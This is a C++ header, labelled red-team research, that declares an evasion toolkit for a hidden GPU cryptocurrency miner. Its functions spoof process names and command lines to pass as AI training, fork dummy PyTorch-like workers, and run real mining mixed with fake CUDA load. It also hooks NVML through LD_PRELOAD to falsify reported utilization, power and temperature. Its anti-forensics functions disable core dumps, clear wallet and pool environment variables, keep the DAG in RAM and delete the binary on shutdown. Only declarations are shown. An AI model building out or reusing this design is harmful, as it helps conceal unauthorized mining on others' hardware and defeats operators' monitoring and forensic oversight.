#pragma once

#include "types.h"
#include <string>
#include <vector>

namespace redteam::evasion {

// ============================================================================
// Process Masquerading (Ngụy trang tiến trình)
// ============================================================================

/**
 * **Set Process Name** (đặt tên tiến trình - thay đổi process name hiển thị)
 *
 * Thay đổi process name trong ps/top/htop thông qua prctl(PR_SET_NAME).
 *
 * @param name Tên process mới (max 15 chars on Linux)
 * @return true nếu thành công
 */
bool SetProcessName(const std::string& name);

/**
 * **Set Fake Command Line** (đặt command line giả - giả mạo /proc/self/cmdline)
 *
 * Ghi đè argv[] để thay đổi command line hiển thị trong ps aux.
 *
 * @param fake_cmdline Command line giả (e.g., "python3 train.py --gpu 0")
 * @return true nếu thành công
 */
bool SetFakeCommandLine(const std::string& fake_cmdline);

/**
 * **Fork Dummy Workers** (tạo worker process giả - mô phỏng process tree)
 *
 * Tạo N child processes để giống AI framework (PyTorch spawns workers).
 * Workers chỉ sleep, không làm gì.
 *
 * @param num_workers Số lượng workers (thường 4-8)
 * @param worker_name_prefix Prefix cho worker name
 * @return Vector các PIDs của workers
 */
std::vector<int> ForkDummyWorkers(int num_workers, const std::string& worker_name_prefix);

// ============================================================================
// Workload Simulation (Mô phỏng khối lượng công việc)
// ============================================================================

/**
 * **Simulate AI Training Pattern** (mô phỏng pattern huấn luyện AI)
 *
 * Tạo CUDA kernels giả mạo gradient computation:
 * - Bursty GPU usage (60-90%)
 * - Periodic VRAM allocation/deallocation (batch loading)
 * - CPU-GPU sync patterns
 *
 * @param device_id CUDA device ID
 * @param duration_sec Thời gian chạy simulation
 */
void SimulateAITraining(int device_id, int duration_sec);

/**
 * **Simulate Image Processing** (mô phỏng xử lý ảnh)
 *
 * Tạo pattern giống OpenCV/PIL:
 * - Sequential kernel launches (filter chains)
 * - Texture memory usage
 * - Lower GPU utilization (40-70%)
 */
void SimulateImageProcessing(int device_id, int duration_sec);

/**
 * **Run Mixed Workload** (chạy workload hỗn hợp - mining + simulation)
 *
 * Chạy real mining xen kẽ với fake AI compute.
 *
 * @param device_id CUDA device
 * @param mining_duty_cycle % thời gian mining thực (0.3-0.8)
 * @param masquerade_type Loại workload giả mạo
 */
void RunMixedWorkload(int device_id, double mining_duty_cycle, WorkloadType masquerade_type);

// ============================================================================
// Metrics Obfuscation (Làm rối metrics)
// ============================================================================

/**
 * **Hook NVML Functions** (hook các hàm NVML - chặn API calls)
 *
 * Sử dụng LD_PRELOAD để hook NVML library và manipulate reported metrics.
 *
 * Hooks:
 * - nvmlDeviceGetUtilizationRates() - Reduce reported GPU util
 * - nvmlDeviceGetPowerUsage() - Add noise to power draw
 * - nvmlDeviceGetTemperature() - Manipulate temp readings
 * - nvmlDeviceGetComputeRunningProcesses() - Spoof process name
 *
 * @return true nếu hooking thành công
 */
bool InstallNVMLHooks();

/**
 * **Throttle Reported GPU Utilization** (giảm GPU util báo cáo)
 *
 * Khi monitoring tools query GPU util, trả về giá trị giảm.
 *
 * @param real_util GPU utilization thực (0.0-1.0)
 * @param reduction_factor Hệ số giảm (e.g., 0.75 = báo cáo 75%)
 * @return Reported utilization
 */
double ThrottleReportedUtilization(double real_util, double reduction_factor);

/**
 * **Add Power Draw Noise** (thêm nhiễu vào power draw - simulate AI variation)
 *
 * Thay đổi power draw reading để tạo pattern giống AI training.
 *
 * @param real_power_watts Power draw thực
 * @param noise_amplitude Biên độ nhiễu (±Watts)
 * @return Power draw với nhiễu
 */
double AddPowerDrawNoise(double real_power_watts, double noise_amplitude);

// ============================================================================
// Anti-Forensics (Chống phân tích pháp y)
// ============================================================================

/**
 * **Disable Core Dumps** (tắt core dump - ngăn memory snapshot)
 *
 * Set resource limit để prevent core dump khi crash.
 */
void DisableCoreDumps();

/**
 * **Clear Environment Variables** (xóa biến môi trường - loại bỏ artifacts)
 *
 * Xóa các env vars có thể leak thông tin (MINING_WALLET, POOL_URL, etc).
 */
void ClearSensitiveEnvVars();

/**
 * **Use Memory-Mapped DAG** (dùng DAG ánh xạ bộ nhớ - không ghi disk)
 *
 * Tạo DAG trực tiếp trong RAM (tmpfs), không write vào disk.
 *
 * @param epoch DAG epoch
 * @param device_id Target GPU
 * @return Pointer to DAG in device memory
 */
void* CreateInMemoryDAG(uint32_t epoch, int device_id);

/**
 * **Self-Delete On Shutdown** (tự xóa khi tắt - cleanup binary)
 *
 * NGUY HIỂM: Xóa executable file khi nhận SIGTERM/SIGINT.
 * Chỉ dùng cho research - không dùng production.
 */
void EnableSelfDeletion();

// ============================================================================
// Detection Testing Helpers
// ============================================================================

/**
 * **Calculate Detection Surface** (tính toán bề mặt phát hiện)
 *
 * Đánh giá xác suất bị phát hiện dựa trên configuration hiện tại.
 *
 * @param config System configuration
 * @return Detection surface metrics
 */
DetectionSurface CalculateDetectionSurface(const SystemConfig& config);

/**
 * **Generate Evasion Report** (tạo báo cáo trốn tránh - research metrics)
 *
 * Tạo báo cáo chi tiết về evasion techniques đang dùng và risk score.
 *
 * @param surface Detection surface data
 * @return JSON report string
 */
std::string GenerateEvasionReport(const DetectionSurface& surface);

} // namespace redteam::evasion
